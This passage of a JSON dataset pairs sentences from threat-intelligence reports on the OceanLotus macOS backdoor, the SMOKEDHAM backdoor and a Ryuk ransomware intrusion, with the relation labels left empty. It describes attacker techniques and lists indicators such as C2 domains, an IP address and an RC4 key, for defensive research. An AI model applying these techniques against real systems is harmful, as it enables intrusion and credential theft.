        "S2": "After the second stage malware downloaded by curl has been entrenched and gained root access, it is able to then download and install additional software as seen in the process tree below:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md::S1<=>S10",
        "S1": "It uses the icon for a Word document file as a disguise, attempting to pass itself off as a legitimate document file.",
        "S2": "Otherwise, if the postfix is .doc without special characters, Microsoft Word is called to open the app bundle as a document; but since it is not a valid document, the app fails to open it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md::S2<=>S9",
        "S1": "Another technique it uses to evade detection is adding special characters to its app bundle name.",
        "S2": "The operating system sees the app bundle as an unsupported directory type, so as a default action the \u201copen\u201d command is used to execute the malicious app.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md::S3<=>S13",
        "S1": "When a user looks for the fake doc folder via the macOS Finder app or the terminal command line, the folder's name shows \"ALL tim nha Chi Ngoc Canada.doc\" (\u201ct\u00ecm nh\u00e0 Ch\u1ecb Ng\u1ecdc\u201d roughly translates to \u201cfind Mrs. Ngoc\u2019s house\u201d).",
        "S2": "- ALL tim nha Chi Ngoc Canada: The shell script containing the main malicious routines",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md::S10<=>S12",
        "S1": "Otherwise, if the postfix is .doc without special characters, Microsoft Word is called to open the app bundle as a document; but since it is not a valid document, the app fails to open it.",
        "S2": "The app bundle contains two notable files:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md::S10<=>S31",
        "S1": "Otherwise, if the postfix is .doc without special characters, Microsoft Word is called to open the app bundle as a document; but since it is not a valid document, the app fails to open it.",
        "S2": "Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md::S11<=>S31",
        "S1": "Here is the code signing information for the app bundle sample.",
        "S2": "Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md::S21<=>S25",
        "S1": "- Change access permission of second-stage payload to execute the launch of the second-stage payload",
        "S2": "When executed, the second stage payload (ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def) performs the following malware routines:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md::S31<=>S36",
        "S1": "Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.",
        "S2": "The new variant\u2019s backdoor capabilities are similar to those of the old OceanLotus sample, as detailed in the code excerpts below:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md::S31<=>S35",
        "S1": "Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.",
        "S2": "Here are the C&C servers used by the malware:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md::S32<=>S34",
        "S1": "It collects the following information from the infected system by invoking the following commands:",
        "S2": "It also receives commands from the same server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md::S34<=>S36",
        "S1": "It also receives commands from the same server.",
        "S2": "The new variant\u2019s backdoor capabilities are similar to those of the old OceanLotus sample, as detailed in the code excerpts below:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S0<=>S2",
        "S1": "Mandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user visited a legitimate site that the victim organization had used before.",
        "S2": "Mandiant confirmed the user intended to download, install, and use the SmartPSS software.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S0<=>S63",
        "S1": "Mandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user visited a legitimate site that the victim organization had used before.",
        "S2": "The following commands were used to create and add the DefaultUser account to the local Administrators group, and subsequently hide the account from the Windows logon screen.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S2<=>S15",
        "S1": "Mandiant confirmed the user intended to download, install, and use the SmartPSS software.",
        "S2": "Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S3<=>S8",
        "S1": "Figure 2 shows an image of the download page used for SmartPSS software.",
        "S2": "The former is a clean installer from the original developer and is launched first, installing the software as the user may expect.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S8<=>S73",
        "S1": "The former is a clean installer from the original developer and is launched first, installing the software as the user may expect.",
        "S2": "NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S11<=>S13",
        "S1": "Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided.",
        "S2": "Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S15<=>S18",
        "S1": "Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported.",
        "S2": "Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S18<=>S24",
        "S1": "Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "S2": "Mandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S22<=>S25",
        "S1": "Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6.",
        "S2": "After the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S24<=>S40",
        "S1": "Mandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "S2": "Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S26<=>S29",
        "S1": "The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor.",
        "S2": "In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S26<=>S55",
        "S1": "The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor.",
        "S2": "If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S27<=>S32",
        "S1": "The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor.",
        "S2": "After defining a new .NET class for the backdoor, the dropper executes the backdoor's entry point.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S27<=>S29",
        "S1": "The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor.",
        "S2": "In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S28<=>S32",
        "S1": "The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable.",
        "S2": "After defining a new .NET class for the backdoor, the dropper executes the backdoor's entry point.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S28<=>S31",
        "S1": "The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable.",
        "S2": "The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S29<=>S31",
        "S1": "In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.",
        "S2": "The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S30<=>S34",
        "S1": "The SMOKEDHAM backdoor source code is embedded as an encrypted string.",
        "S2": "Figure 7 shows the deobfuscated SMOKEDHAM dropper.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S31<=>S74",
        "S1": "The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.",
        "S2": "The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S31<=>S54",
        "S1": "The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.",
        "S2": "The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S33<=>S36",
        "S1": "The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval.",
        "S2": "The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S35<=>S37",
        "S1": "SMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands, including screen capture and keystroke capture.",
        "S2": "SMOKEDHAM communicates with its C2 server using HTTPS.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S36<=>S38",
        "S1": "The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server.",
        "S2": "The backdoor uses domain fronting to obfuscate its true C2 server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S37<=>S41",
        "S1": "SMOKEDHAM communicates with its C2 server using HTTPS.",
        "S2": "The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S39<=>S42",
        "S1": "The fronted domain is configured by an earlier stage of execution and the actual domain is hard-coded in the backdoor.",
        "S2": "The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S40<=>S52",
        "S1": "Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication.",
        "S2": "Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S41<=>S43",
        "S1": "The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests.",
        "S2": "The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S42<=>S44",
        "S1": "The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses.",
        "S2": "The ID field contains a unique value generated by the backdoor for the target system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S43<=>S46",
        "S1": "The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data.",
        "S2": "When the C2 server responds with a command to execute, it sets the UUID field to a unique value.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S43<=>S47",
        "S1": "The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data.",
        "S2": "SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S44<=>S49",
        "S1": "The ID field contains a unique value generated by the backdoor for the target system.",
        "S2": "The backdoor uses the Data field to send command output to its C2 server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S46<=>S49",
        "S1": "When the C2 server responds with a command to execute, it sets the UUID field to a unique value.",
        "S2": "The backdoor uses the Data field to send command output to its C2 server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S47<=>S53",
        "S1": "SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output.",
        "S2": "SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S51<=>S53",
        "S1": "The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field.",
        "S2": "SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S51<=>S54",
        "S1": "The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field.",
        "S2": "The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S52<=>S78",
        "S1": "Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption.",
        "S2": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S53<=>S55",
        "S1": "SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.",
        "S2": "If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S54<=>S56",
        "S1": "The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1.",
        "S2": "The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S55<=>S57",
        "S1": "If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.",
        "S2": "In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S56<=>S58",
        "S1": "The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.",
        "S2": "The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S56<=>S59",
        "S1": "The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.",
        "S2": "SMOKEDHAM was observed executing commands on the target system using PowerShell.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S57<=>S59",
        "S1": "In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes.",
        "S2": "SMOKEDHAM was observed executing commands on the target system using PowerShell.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S58<=>S71",
        "S1": "The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests.",
        "S2": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S59<=>S66",
        "S1": "SMOKEDHAM was observed executing commands on the target system using PowerShell.",
        "S2": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S59<=>S65",
        "S1": "SMOKEDHAM was observed executing commands on the target system using PowerShell.",
        "S2": "Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential to enable credential caching.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S66<=>S69",
        "S1": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
        "S2": "SMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S66<=>S68",
        "S1": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
        "S2": "The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter AllowLoopback=1.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S66<=>S71",
        "S1": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
        "S2": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S71<=>S74",
        "S1": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
        "S2": "The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S71<=>S75",
        "S1": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
        "S2": "SMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S76<=>S78",
        "S1": "This attacker utilized an additional keylogging utility named C:\\ProgramData\\psh\\console.exe.",
        "S2": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S78<=>S80",
        "S1": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
        "S2": "The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S78<=>S84",
        "S1": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
        "S2": "Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S80<=>S83",
        "S1": "The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe.",
        "S2": "The execution of ScareCrow framework dropper C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\\ProgramData\\Cisco\\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S80<=>S82",
        "S1": "The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe.",
        "S2": "The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using Command Prompt.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S80<=>S84",
        "S1": "The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe.",
        "S2": "Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S81<=>S83",
        "S1": "Update.exe was a Go based dropper created using the ScareCrow framework.",
        "S2": "The execution of ScareCrow framework dropper C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\\ProgramData\\Cisco\\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md::S82<=>S84",
        "S1": "The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using Command Prompt.",
        "S2": "Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S0<=>S2",
        "S1": "In our previous Ryuk case, we saw the threat actors leverage access to an environment via the Bazar Loader malware.",
        "S2": "Bazar was introduced to the environment again with the delivery via phishing emails.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S0<=>S6",
        "S1": "In our previous Ryuk case, we saw the threat actors leverage access to an environment via the Bazar Loader malware.",
        "S2": "However, unlike the last case, the threat actors started at a lower privileged user and rather than proceed slowly or cautiously, they exploited the recently disclosed Zerologon vulnerability (CVE-2020-1472) to reset the machine password of the primary domain controller.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S1<=>S6",
        "S1": "This time around, we saw them accomplish their objective faster, but the general tactics and techniques stayed similar between incidents.",
        "S2": "However, unlike the last case, the threat actors started at a lower privileged user and rather than proceed slowly or cautiously, they exploited the recently disclosed Zerologon vulnerability (CVE-2020-1472) to reset the machine password of the primary domain controller.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S1<=>S8",
        "S1": "This time around, we saw them accomplish their objective faster, but the general tactics and techniques stayed similar between incidents.",
        "S2": "The network indicators align similarly to the prior campaign and were noted by Kyle Ehmke in response to our last post pivoting off the prior report\u2019s intel.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S6<=>S9",
        "S1": "However, unlike the last case, the threat actors started at a lower privileged user and rather than proceed slowly or cautiously, they exploited the recently disclosed Zerologon vulnerability (CVE-2020-1472) to reset the machine password of the primary domain controller.",
        "S2": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S7<=>S9",
        "S1": "Lateral movement was initiated via SMB file transfers and WMI executions of Cobalt Strike Beacons.",
        "S2": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S9<=>S14",
        "S1": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "S2": "Once on the main domain controller, another Cobalt Strike beacon was dropped and executed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S9<=>S11",
        "S1": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "S2": "After moving laterally to the secondary domain controller, the threat actor started on more domain discovery via Net and the PowerShell Active Directory module.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S9<=>S20",
        "S1": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "S2": "While last time we commented on the lead time between the first and second day to aid detection and response activity, this case goes to show that you can\u2019t count on that kind of timescale.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S11<=>S13",
        "S1": "After moving laterally to the secondary domain controller, the threat actor started on more domain discovery via Net and the PowerShell Active Directory module.",
        "S2": "At this point, the threat actors used RDP to connect from the secondary domain controller, to the first domain controller, using the built in Administrator account.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S13<=>S16",
        "S1": "At this point, the threat actors used RDP to connect from the secondary domain controller, to the first domain controller, using the built in Administrator account.",
        "S2": "Once this completed, at the four hour mark, the threat actors were ready for their final objective.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S14<=>S43",
        "S1": "Once on the main domain controller, another Cobalt Strike beacon was dropped and executed.",
        "S2": "The presence of the EICAR strings point to the Cobalt Strike software being used as a trial version.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S16<=>S19",
        "S1": "Once this completed, at the four hour mark, the threat actors were ready for their final objective.",
        "S2": "The threat actors finished their objective by executing the ransomware on the primary domain controller, and at the 5 hour mark, the attack completed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S17<=>S19",
        "S1": "Four hours and 10 minutes in, the threat actors used the pivot from the primary domain controller to RDP into the Backup server.",
        "S2": "The threat actors finished their objective by executing the ransomware on the primary domain controller, and at the 5 hour mark, the attack completed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S17<=>S37",
        "S1": "Four hours and 10 minutes in, the threat actors used the pivot from the primary domain controller to RDP into the Backup server.",
        "S2": "After already completing the above discovery work and having already pivoted to their 2nd domain controller, the threat actors moved on to AdFind for further domain reconnaissance.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S19<=>S49",
        "S1": "The threat actors finished their objective by executing the ransomware on the primary domain controller, and at the 5 hour mark, the attack completed.",
        "S2": "This time they initiated the ransomware first on the secondary domain controller (their 1st pivot) and transferred the Ryuk executable over the RDP connection.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S19<=>S26",
        "S1": "The threat actors finished their objective by executing the ransomware on the primary domain controller, and at the 5 hour mark, the attack completed.",
        "S2": "After resetting the password, the threat actors then targeted a different domain controller, potentially due to breaking services by use of their exploit.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S20<=>S47",
        "S1": "While last time we commented on the lead time between the first and second day to aid detection and response activity, this case goes to show that you can\u2019t count on that kind of timescale.",
        "S2": "After our previous report, @kyleehmke pivoted off of our prior Ryuk report and used the network data to link several of these domains which we saw in this case.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S25<=>S28",
        "S1": "CVE-2020-1472 was used to reset the credentials on one of the domain controllers in the environment.",
        "S2": "On one of the domain controllers we saw use of the Cobalt Strike named pipe escalation.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S26<=>S29",
        "S1": "After resetting the password, the threat actors then targeted a different domain controller, potentially due to breaking services by use of their exploit.",
        "S2": "On the first domain controller that the treat actors connected to after their initial connection, they dropped a DLL and executed it via rundll32.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S29<=>S35",
        "S1": "On the first domain controller that the treat actors connected to after their initial connection, they dropped a DLL and executed it via rundll32.",
        "S2": "Then they imported the PowerShell Active Directory module.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S29<=>S31",
        "S1": "On the first domain controller that the treat actors connected to after their initial connection, they dropped a DLL and executed it via rundll32.",
        "S2": "Shortly after, the DLL was called again via regsrv32.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S37<=>S39",
        "S1": "After already completing the above discovery work and having already pivoted to their 2nd domain controller, the threat actors moved on to AdFind for further domain reconnaissance.",
        "S2": "The threat actor then ran this command a few times.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S39<=>S42",
        "S1": "The threat actor then ran this command a few times.",
        "S2": "After transferring the exe, the threat actors utilized WMI from the beachhead host to execute the file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S42<=>S44",
        "S1": "After transferring the exe, the threat actors utilized WMI from the beachhead host to execute the file.",
        "S2": "They accessed the GPO\u2019s for the domain but none were modified or added.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S42<=>S49",
        "S1": "After transferring the exe, the threat actors utilized WMI from the beachhead host to execute the file.",
        "S2": "This time they initiated the ransomware first on the secondary domain controller (their 1st pivot) and transferred the Ryuk executable over the RDP connection.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S43<=>S45",
        "S1": "The presence of the EICAR strings point to the Cobalt Strike software being used as a trial version.",
        "S2": "Shortly there after we saw a Cobalt Strike DLL transferred via the RDP connection.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S44<=>S48",
        "S1": "They accessed the GPO\u2019s for the domain but none were modified or added.",
        "S2": "Starting around 4.5 hours after the initial Bazar malware was executed, the Ryuk threat actors acted on their final objectives and initiated RDP connections from the domain controller previously exploited, to the rest of the environment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md::S45<=>S49",
        "S1": "Shortly there after we saw a Cobalt Strike DLL transferred via the RDP connection.",
